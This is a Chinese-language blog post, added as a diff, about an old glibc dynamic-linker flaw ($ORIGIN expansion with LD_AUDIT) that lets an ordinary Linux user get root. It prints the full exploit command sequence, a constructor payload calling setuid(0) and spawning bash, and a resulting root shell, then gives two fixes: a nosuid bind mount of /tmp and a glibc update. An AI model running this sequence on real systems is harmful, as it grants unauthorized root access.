@@ -1,0 +1,70 @@
+---
+layout: post
+title: linux gcc++漏洞：普通用户获得root权限
+categories:
+- 其它
+tags:
+- linux漏洞
+- root权限
+published: true
+comments: true
+indexer: true
+---
+<p><strong>前言：经我测试在RHEL5 / CentOS5 / FC13都成功了。</strong></p>
+
+<p>首先介绍下一下具体步骤中涉及到的2个频繁的出现的词语:</p>
+
+<p>taviso:作者 Tavis Ormandy 的简称，<a href="http://www.wohuia.com/Topic/3554851" target="_blank">Google</a>信息安全工程师 个人微博：http://my.opera.com/taviso/blog/   <a rel="nofollow" href="http://twitter.com/taviso">http://twitter.com/taviso</a>
+<strong>exploit：</strong>自己创建的目录，表意漏洞利用，可以取任何名字。<!--more--></p>
+
+<p>原理：<strong>The GNU C library dynamic linker expands $ORIGIN in setuid library search path  详见作者博客</strong>
+<img title="更多..." src="http://64.120.134.162/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif" alt="" />
+[cc lang='abap' ]
+$ mkdir /tmp/exploit</p>
+
+<p>$ ln /bin/ping /tmp/exploit/target</p>
+
+<p>$ exec 3&lt; /tmp/exploit/target</p>
+
+<p>$ ls -l /proc/$$/fd/3
+lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -&gt; /tmp/exploit/target*</p>
+
+<p>$ rm -rf /tmp/exploit/</p>
+
+<p>$ ls -l /proc/$$/fd/3
+lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -&gt; /tmp/exploit/target (deleted)</p>
+
+<p>$ cat &gt; payload.c
+void __attribute__((constructor)) init()
+{
+    setuid(0);
+    system("/bin/bash");
+}
+^D
+$ gcc -w -fPIC -shared -o /tmp/exploit payload.c
+$ ls -l /tmp/exploit
+-rwxrwx--- 1 taviso taviso 4.2K Oct 15 09:22 /tmp/exploit*</p>
+
+<p>$ LD_AUDIT="$ORIGIN" exec /proc/self/fd/3
+sh-4.1# whoami
+root
+sh-4.1# id
+uid=0(root) gid=500(taviso)
+[/cc]</p>
+
+<p>看到了吧！是不是很恐怖。以下有2种解决办法：</p>
+
+<p><strong>1，绑定目录</strong></p>
+
+<p><strong>需要理解一下nosuid的原理：<span id="__end"><span style="font-family: Arial; color: #0000ff; font-size: x-small;"><strong></strong></span></span></strong>
+我的理解是：比如/etc/passwd这个文件，本来只有root有权限修改，但是用户本身也可以去修改自己的密码，这就是一种“超出它本身权限的行为”，
+nosuid就是为了停止这种提升特权的办法。比如/tmp目录就有这样的权限，我们就需要对它控制。
+[cc lang='abap' ]
+# mount -o bind /tmp /tmp
+# mount -o remount,bind,nosuid /tmp /tmp
+
+[/cc]
+<strong>2，升级glibc版本（红帽官方提供的解决办法）</strong>
+[cc lang='abap' ]
+#yum update  glibc
+[/cc]</p>
